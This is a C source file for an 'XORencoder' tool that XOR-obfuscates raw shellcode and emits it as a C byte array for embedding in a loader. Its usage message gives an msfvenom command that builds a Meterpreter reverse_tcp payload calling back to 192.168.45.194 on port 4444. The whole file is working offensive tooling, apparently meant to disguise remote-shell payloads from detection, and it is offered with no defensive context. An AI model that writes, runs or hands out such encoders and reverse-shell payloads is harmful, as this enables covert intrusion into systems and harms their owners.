#include <stdio.h>
#include <stdlib.h>
#include <string.h>
// Compile: gcc XORencoder.c -o XORencoder 
// Usage:
// ./XORencoder shellcode.bin 20 -o xordpayload.txt

int main(int argc, char **argv) {
    if (argc < 3 || argc > 5) {
        fprintf(stderr, "Usage: Generate a payload first with: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.194 LPORT=4444 -f raw -o shellcode.bin\n");
        fprintf(stderr, "Usage: %s <shellcode_file> <xor_key> [-o output_file]\n", argv[0]);
        return 1;
    }

    // Parse XOR key (decimal or hex)
    unsigned int key;
    if (sscanf(argv[2], "%i", &key) != 1 || key > 0xFF) {
        fprintf(stderr, "Invalid XOR key. Use a number like 250 or 0xFA.\n");
        return 1;
    }

    const char *input_file = argv[1];
    const char *output_file = NULL;

    if (argc == 5 && strcmp(argv[3], "-o") == 0) {
        output_file = argv[4];
    }

    FILE *fp = fopen(input_file, "rb");
    if (!fp) {
        perror("Error opening input file");
        return 1;
    }

    fseek(fp, 0, SEEK_END);
    long size = ftell(fp);
    rewind(fp);

    if (size <= 0) {
        fprintf(stderr, "Input file is empty or invalid.\n");
        fclose(fp);
        return 1;
    }

    unsigned char *buf = malloc(size);
    if (!buf) {
        perror("Memory allocation failed");
        fclose(fp);
        return 1;
    }

    fread(buf, 1, size, fp);
    fclose(fp);

    FILE *out = stdout;
    if (output_file) {
        out = fopen(output_file, "w");
        if (!out) {
            perror("Error opening output file");
            free(buf);
            return 1;
        }
    }

    fprintf(out, "unsigned char encoded[] =\n\"");
    for (long i = 0; i < size; i++) {
        fprintf(out, "\\x%02X", buf[i] ^ (unsigned char)key);
        if ((i + 1) % 16 == 0) fprintf(out, "\"\n\"");
    }
    fprintf(out, "\";\n");
    fprintf(out, "int shellcode_len = %ld;\n", size);

    if (output_file) fclose(out);
    free(buf);

    return 0;
}
